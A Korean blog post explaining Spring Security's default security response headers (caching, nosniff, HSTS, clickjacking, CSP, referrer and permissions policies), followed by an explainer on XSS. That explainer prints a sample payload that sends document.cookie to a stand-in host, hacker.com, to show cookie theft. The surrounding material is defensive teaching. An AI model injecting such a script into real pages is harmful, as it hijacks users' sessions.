---
title: Protection Against Exploits - Http Headers
description: 
author: laze
date: 2025-05-09 00:00:01 +0900
categories: [Dev, SpringSecurity]
tags: [SpringSecurity]
---
## 보안 HTTP 응답 헤더 (Security HTTP Response Headers)

이 문서 부분에서는 보안 HTTP 응답 헤더의 일반적인 주제에 대해 설명합니다.

웹 애플리케이션의 보안을 강화하기 위해 여러 가지 방법으로 HTTP 응답 헤더를 사용할 수 있습니다.

이 섹션은 Spring Security가 명시적으로 지원하는 다양한 HTTP 응답 헤더에 대해 설명합니다.

필요한 경우 Spring Security를 구성하여 사용자 정의 헤더를 제공할 수도 있습니다.

### 기본 보안 헤더

Spring Security는 안전한 기본값을 제공하기 위해 기본 보안 관련 HTTP 응답 헤더 세트를 제공합니다.

Spring Security의 기본값은 다음 헤더를 포함하는 것입니다:

**기본 보안 HTTP 응답 헤더**

```
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Frame-Options: DENY
X-XSS-Protection: 0
```

`Strict-Transport-Security`는 HTTPS 요청에만 추가됩니다.

기본값이 사용자의 요구 사항을 충족하지 않는 경우 이러한 기본값에서 헤더를 쉽게 제거, 수정 또는 추가할 수 있습니다. 이러한 각 헤더에 대한 자세한 내용은 해당 섹션을 참조하세요:

- 캐시 제어 (Cache Control)
- 콘텐츠 유형 옵션 (Content Type Options)
- HTTP 엄격한 전송 보안 (HTTP Strict Transport Security)
- X-Frame-Options
- X-XSS-Protection

### 캐시 제어 (Cache Control)

Spring Security의 기본값은 사용자 콘텐츠를 보호하기 위해 캐싱을 비활성화하는 것입니다.

사용자가 민감한 정보를 보기 위해 인증한 후 로그아웃하는 경우, 악의적인 사용자가 뒤로 가기 버튼을 클릭하여 민감한 정보를 볼 수 없도록 해야 합니다.

기본적으로 전송되는 캐시 제어 헤더는 다음과 같습니다:

**기본 캐시 제어 HTTP 응답 헤더**

```
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
```

기본적으로 안전하도록 Spring Security는 이러한 헤더를 기본적으로 추가합니다.

그러나 애플리케이션이 자체 캐시 제어 헤더를 제공하는 경우 Spring Security는 개입하지 않습니다.

이를 통해 애플리케이션은 정적 리소스(예: CSS 및 JavaScript)를 캐시할 수 있도록 보장할 수 있습니다.

### 콘텐츠 유형 옵션 (Content Type Options)

역사적으로 Internet Explorer를 포함한 브라우저는 콘텐츠 스니핑(content sniffing)을 사용하여 요청의 콘텐츠 유형을 추측하려고 했습니다.

이를 통해 브라우저는 콘텐츠 유형이 지정되지 않은 리소스의 콘텐츠 유형을 추측하여 사용자 경험을 개선할 수 있었습니다.

예를 들어, 브라우저가 콘텐츠 유형이 지정되지 않은 JavaScript 파일을 발견하면 콘텐츠 유형을 추측한 다음 실행할 수 있었습니다.

콘텐츠 업로드를 허용할 때 수행해야 할 추가적인 많은 작업(예: 문서를 별개의 도메인에만 표시, `Content-Type` 헤더 설정 확인, 문서 살균 등)이 있습니다.

그러나 이러한 조치는 Spring Security가 제공하는 범위 밖에 있습니다.

또한 콘텐츠 스니핑을 비활성화할 때 작업이 제대로 작동하려면 콘텐츠 유형을 지정해야 한다는 점을 지적하는 것이 중요합니다.

콘텐츠 스니핑의 문제점은 악의적인 사용자가 여러 콘텐츠 유형으로 유효한 파일인 폴리글롯(polyglots)을 사용하여 XSS 공격을 수행할 수 있다는 것입니다.

예를 들어, 일부 사이트에서는 사용자가 유효한 포스트스크립트 문서를 웹사이트에 제출하고 볼 수 있도록 허용할 수 있습니다.

악의적인 사용자는 유효한 JavaScript 파일이기도 한 포스트스크립트 문서를 만들어 XSS 공격을 수행할 수 있습니다.

기본적으로 Spring Security는 HTTP 응답에 다음 헤더를 추가하여 콘텐츠 스니핑을 비활성화합니다:

**nosniff HTTP 응답 헤더**

```
X-Content-Type-Options: nosniff
```

### HTTP 엄격한 전송 보안 (HSTS - HTTP Strict Transport Security)

은행 웹사이트에 입력할 때 `mybank.example.com`을 입력합니까, 아니면 `https://mybank.example.com`을 입력합니까?

https 프로토콜을 생략하면 잠재적으로 중간자 공격(Man-in-the-Middle attacks)에 취약해집니다.

웹사이트가 `https://mybank.example.com`으로 리디렉션하더라도 악의적인 사용자는 초기 HTTP 요청을 가로채고 응답을 조작할 수 있습니다(예: `https://mibank.example.com`으로 리디렉션하여 자격 증명 도용).

많은 사용자가 https 프로토콜을 생략하며, 이것이 HTTP 엄격한 전송 보안(HSTS)이 만들어진 이유입니다.

`mybank.example.com`이 HSTS 호스트로 추가되면 브라우저는 `mybank.example.com`에 대한 모든 요청을 `https://mybank.example.com`으로 해석해야 함을 미리 알 수 있습니다.

이는 중간자 공격 발생 가능성을 크게 줄입니다.

RFC6797에 따라 HSTS 헤더는 HTTPS 응답에만 주입됩니다.

브라우저가 헤더를 인식하려면 브라우저는 먼저 연결을 만드는 데 사용된 SSL 인증서(단순히 SSL 인증서만이 아님)를 서명한 CA를 신뢰해야 합니다.

사이트가 HSTS 호스트로 표시되는 한 가지 방법은 호스트를 브라우저에 미리 로드하는 것입니다.

또 다른 방법은 응답에 `Strict-Transport-Security` 헤더를 추가하는 것입니다.

예를 들어, Spring Security의 기본 동작은 다음 헤더를 추가하여 브라우저에 도메인을 1년 동안 HSTS 호스트로 처리하도록 지시하는 것입니다(평년에는 31536000초가 있음):

**Strict Transport Security HTTP 응답 헤더**

```
Strict-Transport-Security: max-age=31536000 ; includeSubDomains ; preload
```

선택적 `includeSubDomains` 지시문은 브라우저에 하위 도메인(예: `secure.mybank.example.com`)도 HSTS 도메인으로 처리해야 함을 지시합니다.

선택적 `preload` 지시문은 브라우저에 도메인을 HSTS 도메인으로 브라우저에 미리 로드해야 함을 지시합니다.

HSTS 사전 로드에 대한 자세한 내용은 hstspreload.org를 참조하세요.

### HTTP 공개 키 고정 (HPKP - HTTP Public Key Pinning)

수동적으로 유지하기 위해 Spring Security는 여전히 서블릿 환경에서 HPKP를 지원합니다.

그러나 앞서 언급한 이유로 HPKP는 더 이상 Spring Security 팀에서 권장하지 않습니다.

HTTP 공개 키 고정(HPKP)은 위조된 인증서를 사용한 중간자(MITM) 공격을 방지하기 위해 특정 웹 서버와 함께 사용할 공개 키를 웹 클라이언트에 지정합니다.

올바르게 사용하면 HPKP는 손상된 인증서에 대한 추가 보호 계층을 추가할 수 있습니다.

그러나 HPKP의 복잡성으로 인해 많은 전문가들은 더 이상 사용을 권장하지 않으며 Chrome은 지원을 제거하기까지 했습니다.

### X-Frame-Options

웹사이트를 프레임에 추가하도록 허용하는 것은 보안 문제가 될 수 있습니다.

예를 들어, 교묘한 CSS 스타일링을 사용하여 사용자는 의도하지 않은 것을 클릭하도록 속을 수 있습니다.

예를 들어, 은행에 로그인한 사용자가 다른 사용자에게 액세스 권한을 부여하는 버튼을 클릭할 수 있습니다.

이러한 종류의 공격을 클릭재킹(Clickjacking)이라고 합니다.

클릭재킹을 처리하는 또 다른 최신 접근 방식은 콘텐츠 보안 정책(CSP)을 사용하는 것입니다.

클릭재킹 공격을 완화하는 여러 가지 방법이 있습니다.

예를 들어, 레거시 브라우저를 클릭재킹 공격으로부터 보호하기 위해 프레임 파괴 코드(frame breaking code)를 사용할 수 있습니다.

완벽하지는 않지만 프레임 파괴 코드는 레거시 브라우저에 대해 할 수 있는 최선입니다.

클릭재킹을 해결하는 보다 현대적인 접근 방식은 `X-Frame-Options` 헤더를 사용하는 것입니다.

기본적으로 Spring Security는 다음 헤더를 사용하여 iframe 내에서 페이지 렌더링을 비활성화합니다:

```
X-Frame-Options: DENY
```

### X-XSS-Protection

일부 브라우저에는 반사형 XSS(reflected XSS) 공격을 필터링하는 기본 제공 지원 기능이 있습니다.

이 필터는 주요 브라우저에서 사용 중단되었으며, 현재 OWASP 권장 사항은 헤더를 명시적으로 `0`으로 설정하는 것입니다.

기본적으로 Spring Security는 다음 헤더를 사용하여 콘텐츠를 차단합니다:

```
X-XSS-Protection: 0
```

### 콘텐츠 보안 정책 (CSP - Content Security Policy)

콘텐츠 보안 정책(CSP)은 웹 애플리케이션이 사이트 간 스크립팅(XSS)과 같은 콘텐츠 주입 취약성을 완화하는 데 사용할 수 있는 메커니즘입니다.

CSP는 웹 애플리케이션 작성자가 웹 애플리케이션이 리소스를 로드할 것으로 예상되는 출처에 대해 선언하고 궁극적으로 클라이언트(사용자 에이전트)에 알리는 기능을 제공하는 선언적 정책입니다.

콘텐츠 보안 정책은 모든 콘텐츠 주입 취약성을 해결하기 위한 것이 아닙니다.

대신 CSP를 사용하여 콘텐츠 주입 공격으로 인한 피해를 줄이는 데 도움을 줄 수 있습니다.

첫 번째 방어선으로 웹 애플리케이션 작성자는 입력을 확인하고 출력을 인코딩해야 합니다.

웹 애플리케이션은 응답에 다음 HTTP 헤더 중 하나를 포함하여 CSP를 사용할 수 있습니다:

- `Content-Security-Policy`
- `Content-Security-Policy-Report-Only`

이러한 각 헤더는 클라이언트에 보안 정책을 전달하는 메커니즘으로 사용됩니다.

보안 정책에는 특정 리소스 표현에 대한 제한을 선언하는 역할을 하는 보안 정책 지시문 세트가 포함됩니다.

예를 들어, 웹 애플리케이션은 응답에 다음 헤더를 포함하여 특정 신뢰할 수 있는 출처에서 스크립트를 로드할 것으로 예상한다고 선언할 수 있습니다:

**콘텐츠 보안 정책 예시**

```
Content-Security-Policy: script-src <https://trustedscripts.example.com>
```

`script-src` 지시문에 선언된 것 이외의 다른 출처에서 스크립트를 로드하려는 시도는 사용자 에이전트에 의해 차단됩니다.

또한 보안 정책에 `report-uri` 지시문이 선언된 경우 위반 사항은 사용자 에이전트에 의해 선언된 URL로 보고됩니다.

예를 들어, 웹 애플리케이션이 선언된 보안 정책을 위반하는 경우 다음 응답 헤더는 사용자 에이전트에 정책의 `report-uri` 지시문에 지정된 URL로 위반 보고서를 보내도록 지시합니다.

**report-uri가 있는 콘텐츠 보안 정책**

```
Content-Security-Policy: script-src <https://trustedscripts.example.com>; report-uri /csp-report-endpoint/
```

위반 보고서는 웹 애플리케이션 자체 API 또는 [report-uri.io/와](http://report-uri.io/%EC%99%80) 같은 공개적으로 호스팅되는 CSP 위반 보고 서비스에서 캡처할 수 있는 표준 JSON 구조입니다.

`Content-Security-Policy-Report-Only` 헤더는 웹 애플리케이션 작성자 및 관리자가 보안 정책을 시행하는 대신 모니터링할 수 있는 기능을 제공합니다.

이 헤더는 일반적으로 사이트의 보안 정책을 실험하거나 개발할 때 사용됩니다.

정책이 효과적이라고 간주되면 대신 `Content-Security-Policy` 헤더 필드를 사용하여 시행할 수 있습니다.

다음 응답 헤더가 주어지면 정책은 스크립트를 두 가지 가능한 출처 중 하나에서 로드할 수 있다고 선언합니다.

**콘텐츠 보안 정책 보고서만 (Report Only)**

```
Content-Security-Policy-Report-Only: script-src 'self' <https://trustedscripts.example.com>; report-uri /csp-report-endpoint/
```

사이트가 `evil.example.com`에서 스크립트를 로드하려고 시도하여 이 정책을 위반하면 사용자 에이전트는 `report-uri` 지시문에 지정된 선언된 URL로 위반 보고서를 보내지만 위반 리소스는 계속 로드하도록 허용합니다.

웹 애플리케이션에 콘텐츠 보안 정책을 적용하는 것은 종종 간단하지 않은 작업입니다.

다음 리소스는 사이트에 대한 효과적인 보안 정책을 개발하는 데 추가적인 도움이 될 수 있습니다:

- 콘텐츠 보안 정책 소개
- CSP 가이드 - Mozilla 개발자 네트워크
- W3C 후보 권고안

### 리퍼러 정책 (Referrer Policy)

리퍼러 정책은 웹 애플리케이션이 사용자가 이전에 있었던 마지막 페이지를 포함하는 리퍼러 필드를 관리하는 데 사용할 수 있는 메커니즘입니다.

Spring Security의 접근 방식은 다양한 정책을 제공하는 리퍼러 정책 헤더를 사용하는 것입니다:

**리퍼러 정책 예시**

```
Referrer-Policy: same-origin
```

`Referrer-Policy` 응답 헤더는 브라우저에 사용자가 이전에 있었던 출처를 대상에 알리도록 지시합니다.

### 기능 정책 (Feature Policy) - 이제 Permissions Policy로 대체됨

기능 정책은 웹 개발자가 브라우저의 특정 API 및 웹 기능의 동작을 선택적으로 활성화, 비활성화 및 수정할 수 있도록 하는 메커니즘입니다.
*(역주: Feature Policy는 Permissions Policy로 이름이 변경되었고 표준화되었습니다.)*

**기능 정책 예시**

```
Feature-Policy: geolocation 'self'
```

기능 정책을 통해 개발자는 사이트 전체에서 사용되는 특정 기능에 대해 브라우저가 시행할 "정책" 세트를 선택할 수 있습니다.

이러한 정책은 사이트가 액세스할 수 있는 API를 제한하거나 특정 기능에 대한 브라우저의 기본 동작을 수정합니다.

### 권한 정책 (Permissions Policy)

권한 정책은 웹 개발자가 브라우저의 특정 API 및 웹 기능의 동작을 선택적으로 활성화, 비활성화 및 수정할 수 있도록 하는 메커니즘입니다.

**권한 정책 예시**

```
Permissions-Policy: geolocation=(self)
```

권한 정책을 통해 개발자는 사이트 전체에서 사용되는 특정 기능에 대해 브라우저가 시행할 "정책" 세트를 선택할 수 있습니다.

이러한 정책은 사이트가 액세스할 수 있는 API를 제한하거나 특정 기능에 대한 브라우저의 기본 동작을 수정합니다.

### 사이트 데이터 지우기 (Clear Site Data)

서블릿 및 웹플럭스 기반 애플리케이션 모두 구성 방법은 관련 섹션을 참조하세요.

사이트 데이터 지우기는 HTTP 응답에 이 헤더가 포함될 때 모든 브라우저 측 데이터(쿠키, 로컬 스토리지 등)를 제거할 수 있는 메커니즘입니다:

```
Clear-Site-Data: "cache", "cookies", "storage", "executionContexts"
```

이는 로그아웃 시 수행하기 좋은 정리 작업입니다.

### 사용자 정의 헤더 (Custom Headers)

Spring Security에는 더 일반적인 보안 헤더를 애플리케이션에 편리하게 추가할 수 있는 메커니즘이 있습니다. 그러나 사용자 정의 헤더 추가를 활성화하는 후크도 제공합니다.

---

### 🛡️ 웹사이트 안전벨트! 보안 HTTP 응답 헤더로 무장하기!

우리가 웹사이트를 만들 때, 눈에 보이는 기능뿐만 아니라 눈에 보이지 않는 보안 설정도 아주 중요해요. Spring Security는 웹사이트가 외부 공격으로부터 더 안전해지도록 여러 가지 "보안 HTTP 응답 헤더"를 기본적으로 설정해줍니다.

이 헤더들은 웹 브라우저에게 특정 보안 지침을 전달해서, 다양한 공격을 예방하는 데 도움을 줘요.

### 1. Spring Security가 기본으로 달아주는 안전장치들 기본 보안 헤더

Spring Security를 사용하면, 별다른 설정을 하지 않아도 다음과 같은 유용한 보안 헤더들이 HTTP 응답에 자동으로 포함돼요. (마치 자동차를 사면 기본으로 에어백이 달려 나오는 것처럼요!)

- **`Cache-Control: no-cache, no-store, max-age=0, must-revalidate`**
- **`Pragma: no-cache`** (구형 브라우저 호환용)
- **`Expires: 0`** (구형 브라우저 호환용)
  - ➡️ **역할:** "이 페이지 내용은 절대 브라우저에 저장(캐시)하지 마!"
  - **왜?** 만약 민감한 정보(예: 은행 잔고)가 있는 페이지를 보고 로그아웃했는데, 그 내용이 브라우저에 남아있다면? 다른 사람이 뒤로 가기 버튼을 눌러서 그 정보를 볼 수도 있겠죠? 그걸 막아줘요.
  - **예외:** CSS 파일이나 이미지 같은 정적 파일들은 캐시해도 괜찮으니, 이런 경우에는 Spring Security가 알아서 이 헤더를 적용하지 않거나 우리가 직접 설정을 바꿀 수 있어요.
- **`X-Content-Type-Options: nosniff`**
  - ➡️ **역할:** "브라우저야, 네 맘대로 파일 종류(Content-Type) 추측하지 마! 내가 알려준 대로만 해석해!"
  - **왜?** 옛날 브라우저들은 파일 종류가 명확하지 않으면 "음... 이건 JavaScript 파일 같은데?" 하고 멋대로 추측해서 실행하곤 했어요. 이걸 악용해서 해커가 이미지 파일처럼 위장한 악성 스크립트를 실행시킬 수 있었죠. (이런 파일을 "폴리글롯"이라고 해요.) 이 헤더는 그런 "콘텐츠 스니핑"을 막아줘요.
- **`Strict-Transport-Security: max-age=31536000 ; includeSubDomains` (HSTS)** (HTTPS 요청에만 적용됨)
  - ➡️ **역할:** "이 웹사이트는 앞으로 1년 동안 무조건 HTTPS로만 접속해야 해! 하위 도메인(subdomain)도 마찬가지야!"
  - **왜?** 우리가 `mybank.com`이라고 주소창에 치면, 사실은 `http://mybank.com`으로 먼저 접속 시도될 수 있어요. 이때 중간에서 해커가 정보를 가로채거나 가짜 사이트로 유도할 수 있죠 (중간자 공격). HSTS는 한번 HTTPS로 접속했던 사이트라면, 브라우저가 다음부터는 자동으로 `https://mybank.com`으로만 접속하도록 강제해요.
  - `preload` 옵션을 추가하면, 아예 브라우저 제조사들이 관리하는 "HSTS 미리 로드 목록"에 우리 사이트를 등록해서, 사용자가 처음 방문할 때부터 HTTPS로 접속하도록 만들 수도 있어요 (더 안전!).
- **`X-Frame-Options: DENY`**
  - ➡️ **역할:** "우리 웹사이트 페이지는 다른 웹사이트의 `<iframe>` 안에 절대 표시하지 마!"
  - **왜?** 해커가 자기 사이트에 투명한 `<iframe>`을 만들고 그 안에 우리 은행 사이트를 몰래 숨겨둘 수 있어요. 그리고 사용자를 속여서 "공짜 선물 받기" 버튼을 누르게 하는데, 사실 그 버튼 아래에는 우리 은행 사이트의 "송금하기" 버튼이 있는 거죠! 이런 공격을 "클릭재킹(Clickjacking)"이라고 해요. 이 헤더는 우리 사이트가 `<iframe>` 안에 갇히는 걸 막아줘요. (`DENY`: 완전히 금지, `SAMEORIGIN`: 우리 사이트 내의 페이지끼리는 허용)
- **`X-XSS-Protection: 0`**
  - ➡️ **역할:** "브라우저의 내장 XSS 필터 기능 끄기!" (좀 이상하죠? 끄는 게 보안이라니!)
  - **왜?** 예전 브라우저들은 자체적으로 XSS 공격을 막아보려는 필터 기능이 있었어요. 하지만 이 기능이 오히려 새로운 보안 문제를 만들거나, 제대로 작동하지 않는 경우가 많았어요. 그래서 요즘은 이 기능을 끄고, 대신 더 강력하고 표준화된 방법인 **CSP(콘텐츠 보안 정책)**를 사용하는 것이 권장돼요. 이 헤더 값을 `0`으로 설정하는 것이 바로 "브라우저 내장 XSS 필터 끄기"를 의미합니다.

### 2. 더 강력한 방어막: 콘텐츠 보안 정책 (CSP - Content Security Policy) 📜

CSP는 마치 웹사이트의 "화이트리스트" 같은 거예요. 우리 웹사이트가 어떤 출처(source)에서 스크립트, 스타일시트, 이미지 등을 가져와도 되는지 미리 브라우저에게 알려주는 거죠.

- **예시:** `Content-Security-Policy: script-src <https://apis.google.com> 'self';`
  - ➡️ "스크립트는 `https://apis.google.com` 또는 우리 웹사이트 도메인(`'self'`)에서 온 것만 허용할 거야! 다른 데서 온 스크립트는 실행하지 마!"
- **장점:**
  - XSS 공격 (악성 스크립트 주입)을 막는 데 매우 효과적이에요. 허용되지 않은 출처의 스크립트는 아예 실행되지 않으니까요.
  - 데이터 유출, 클릭재킹 등 다양한 공격을 방어하는 데도 도움이 돼요.
- **종류:**
  - `Content-Security-Policy`: 정책을 실제로 **적용**해요. 위반하면 차단!
  - `Content-Security-Policy-Report-Only`: 정책을 적용하진 않지만, 만약 위반 사항이 있으면 서버로 **보고**만 해줘요. (처음 CSP 도입할 때 테스트용으로 유용해요.)
- **설정이 복잡할 수 있어요!** 어떤 리소스를 어디서 가져오는지 꼼꼼히 파악하고 정책을 만들어야 해서, 처음엔 좀 어려울 수 있어요. 하지만 그만큼 강력한 보안을 제공합니다.

### 3. 기타 유용한 보안 헤더들 ✨

- **`Referrer-Policy: same-origin`**
  - ➡️ **역할:** "다른 웹사이트로 이동할 때, 이전 페이지(Referrer) 정보를 같은 출처(도메인)일 때만 알려줘!"
  - **왜?** 사용자가 A 사이트에서 B 사이트로 링크를 타고 이동하면, B 사이트는 "이 사용자가 A 사이트에서 왔구나"라는 정보를 알 수 있어요 (HTTP Referer 헤더). 여기에 민감한 정보가 포함될 수도 있어서, 이 헤더로 정보 전달 범위를 제어할 수 있어요. `same-origin`은 같은 도메인끼리만 리퍼러 정보를 공유하겠다는 뜻이에요.
- **`Permissions-Policy` (이전 이름: `Feature-Policy`)**
  - ➡️ **역할:** "우리 웹사이트에서 마이크, 카메라, 위치 정보 같은 브라우저 기능을 사용할 수 있는 범위를 제한할 거야!"
  - **왜?** 웹사이트가 필요하지도 않은 브라우저 기능에 접근하는 것을 막아서 사용자의 프라이버시를 보호하고, 악의적인 기능 사용을 차단할 수 있어요.
  - **예시:** `Permissions-Policy: geolocation=(self), camera=()` (위치 정보는 우리 도메인에서만 허용, 카메라는 아무 데서도 허용 안 함)
- **`Clear-Site-Data: "cookies", "storage"`**
  - ➡️ **역할:** "이 응답을 받으면, 브라우저는 이 웹사이트와 관련된 쿠키랑 로컬 스토리지 데이터 싹 다 지워!"
  - **왜?** 사용자가 로그아웃할 때 이 헤더를 보내주면, 브라우저에 남아있을 수 있는 민감한 데이터를 깔끔하게 정리할 수 있어서 좋아요.

### 중요! Spring Security의 역할

Spring Security는 이러한 헤더들을 **쉽게 설정하고 관리할 수 있도록 도와줍니다.** 기본적으로 안전한 설정을 제공하고, 필요에 따라 우리가 직접 헤더를 추가하거나, 기존 설정을 변경하거나, 특정 헤더를 제거할 수도 있어요.

---

아, 좋은 질문입니다! `X-XSS-Protection` 헤더를 이해하려면 먼저 **XSS(Cross-Site Scripting, 사이트 간 스크립팅) 공격**이 무엇인지 알아야 해요. 이 부분을 먼저 설명드리고, 그다음에 `X-XSS-Protection` 헤더의 역할을 알려드릴게요.

### 😈 XSS (Cross-Site Scripting) 공격이란?

**XSS 공격**은 웹 애플리케이션의 취약점을 이용해, **악의적인 스크립트(주로 JavaScript)를 다른 사용자의 웹 브라우저에서 실행시키는 공격**입니다.

마치 다른 사람의 집에 몰래 들어가서 그 사람인 척 이상한 낙서를 하거나 물건을 훔치는 것과 비슷해요. 여기서 "집"은 사용자의 웹 브라우저, "낙서나 물건"은 악성 스크립트, "그 사람인 척"은 해당 웹사이트에 대한 사용자의 권한(쿠키, 세션 등)을 이용하는 것을 의미합니다.

**어떻게 공격할까요? (간단한 예시)**

1. **공격자:** 어떤 웹사이트의 게시판이나 댓글 입력란에 다음과 같은 악성 스크립트를 포함한 글을 작성합니다.

    ```html
    안녕하세요! <script>alert('해킹당했습니다!');</script> 좋은 하루 보내세요!
    
    ```

   또는 사용자의 쿠키를 훔쳐 자신의 서버로 전송하는 스크립트를 넣을 수도 있습니다.

    ```html
    <script>document.location='<http://hacker.com/steal?cookie=>' + document.cookie;</script>
    
    ```

2. **웹사이트의 취약점:** 만약 웹사이트가 사용자의 입력값을 제대로 검증하거나 필터링하지 않고 그대로 HTML 페이지에 포함시킨다면...
3. **피해자:** 다른 사용자가 그 악성 스크립트가 포함된 게시글이나 댓글을 보게 되면, **피해자의 웹 브라우저에서 그 악성 스크립트가 실행**됩니다.
  - 위 첫 번째 예시에서는 '해킹당했습니다!'라는 경고창이 뜰 겁니다.
  - 두 번째 예시에서는 피해자의 쿠키 정보(로그인 정보 등)가 해커의 서버로 전송될 수 있습니다.

**XSS 공격으로 할 수 있는 나쁜 짓들:**

- **쿠키/세션 탈취:** 사용자의 로그인 정보를 훔쳐서 계정을 도용할 수 있습니다. (가장 흔하고 위험!)
- **악성코드 감염 유도:** 사용자를 악성코드가 있는 사이트로 유도하거나, 악성 파일을 다운로드하게 만들 수 있습니다.
- **피싱 사이트로 유도:** 가짜 로그인 페이지 등을 보여주고 사용자 정보를 입력하게 만들 수 있습니다.
- **웹사이트 내용 변조:** 사용자에게 보이는 웹사이트 내용을 마음대로 바꿀 수 있습니다.
- **키 입력 가로채기(Keylogging):** 사용자가 입력하는 내용을 몰래 훔쳐볼 수 있습니다.

XSS 공격은 크게 세 가지 유형으로 나뉩니다:

1. **Stored XSS (저장형 XSS):** 악성 스크립트가 웹사이트의 데이터베이스 등에 저장되었다가, 사용자가 해당 데이터를 조회할 때 실행되는 방식입니다. (게시판, 댓글 등)
2. **Reflected XSS (반사형 XSS):** 악성 스크립트가 URL의 파라미터 등을 통해 전달되고, 서버가 그 값을 그대로 응답 페이지에 포함시켜 사용자 브라우저에서 실행되는 방식입니다. (검색 결과 페이지 등)
3. **DOM-based XSS (DOM 기반 XSS):** 서버와는 상관없이, 클라이언트 측 JavaScript 코드의 취약점을 이용해 DOM(Document Object Model)을 조작하여 악성 스크립트가 실행되는 방식입니다.

### 🛡️ X-XSS-Protection 헤더의 역할

자, 이제 XSS 공격이 뭔지 알았으니 `X-XSS-Protection` 헤더의 역할을 이해하기 쉬워집니다.

`X-XSS-Protection` 헤더는 **웹 브라우저에 내장된 XSS 필터 기능을 제어**하는 HTTP 응답 헤더입니다. 예전에는 일부 브라우저(주로 Internet Explorer, Chrome 구버전 등)들이 자체적으로 반사형 XSS 공격을 탐지하고 차단하려는 시도를 했어요. 이 헤더는 그 기능을 켜거나 끄거나, 또는 특정 모드로 동작하도록 지시하는 역할을 했습니다.

**가능한 값들:**

- **`X-XSS-Protection: 0`**: 브라우저의 XSS 필터 기능을 **끈다(비활성화한다)**.
- **`X-XSS-Protection: 1`**: 브라우저의 XSS 필터 기능을 **켠다(활성화한다)**. 만약 XSS 공격이 탐지되면, 브라우저는 해당 스크립트를 제거하거나 페이지를 안전하게 변경하려고 시도합니다. (기본값이었던 경우가 많음)
- **`X-XSS-Protection: 1; mode=block`**: XSS 필터 기능을 켜고, 만약 XSS 공격이 탐지되면 스크립트를 제거하는 대신 **페이지 전체 렌더링을 중단**하고 아무것도 보여주지 않습니다. (더 안전한 모드)
- **`X-XSS-Protection: 1; report=<reporting-URI>`**: XSS 필터 기능을 켜고, XSS 공격이 탐지되면 위반 사항을 지정된 URI로 보고합니다.

**🤔 그런데 왜 Spring Security 기본값은 `X-XSS-Protection: 0` (끄기) 일까요?**

앞서 "학습하자" 부분에서 잠깐 언급했듯이, 이 브라우저 내장 XSS 필터 기능들이 **완벽하지 않고 오히려 다음과 같은 문제점**들을 가지고 있었기 때문입니다:

1. **오탐 (False Positives):** 정상적인 코드를 XSS 공격으로 잘못 판단하여 웹사이트가 깨지거나 오작동하는 경우가 있었습니다.
2. **우회 가능성:** 해커들이 이 필터 기능을 우회하는 새로운 XSS 공격 기법을 개발하기도 했습니다.
3. **새로운 취약점 유발:** 일부 경우에는 XSS 필터 자체가 또 다른 보안 취약점(XSS Auditor bypass 등)을 만들기도 했습니다.
4. **브라우저마다 동작 방식 상이:** 모든 브라우저가 이 기능을 동일하게 지원하거나 동작하지 않았습니다.

이러한 이유로, **최신 웹 보안 권고 사항은 브라우저의 내장 XSS 필터에 의존하기보다는, 더 강력하고 표준화된 방법인 CSP(Content Security Policy)를 사용하고, `X-XSS-Protection` 헤더는 `0`으로 설정하여 이 오래된 필터 기능을 명시적으로 끄는 것입니다.**

즉, Spring Security가 `X-XSS-Protection: 0`을 기본으로 하는 것은 "우리는 구식이고 불안정한 XSS 필터 안 쓸 거야! 대신 CSP 같은 더 좋은 방법으로 XSS 막을 거니까, 브라우저 너는 괜히 간섭하지 마!" 라는 의미로 해석할 수 있습니다.

**XSS 공격을 막는 근본적인 방법은 다음과 같습니다:**

- **입력값 검증 (Input Validation):** 사용자가 입력하는 모든 데이터를 서버에서 꼼꼼히 검증합니다. (예: 스크립트 태그나 위험한 특수문자 포함 여부 확인)
- **출력값 이스케이프/인코딩 (Output Escaping/Encoding):** 사용자가 입력한 데이터를 HTML 페이지에 다시 보여줄 때는, `<`, `>`, `&`, `"` 같은 특수문자들이 HTML 태그나 스크립트로 해석되지 않도록 반드시 이스케이프(escape) 처리해야 합니다. (예: `<`를 `&lt;`로 변경)
- **콘텐츠 보안 정책 (CSP) 사용:** 위에서 배운 CSP를 통해 신뢰할 수 있는 출처의 리소스만 로드하도록 제한합니다.
- **최신 프레임워크/라이브러리 사용:** 대부분의 최신 웹 프레임워크(Spring 포함)는 XSS 방어 기능을 내장하고 있거나 쉽게 적용할 수 있도록 지원합니다.
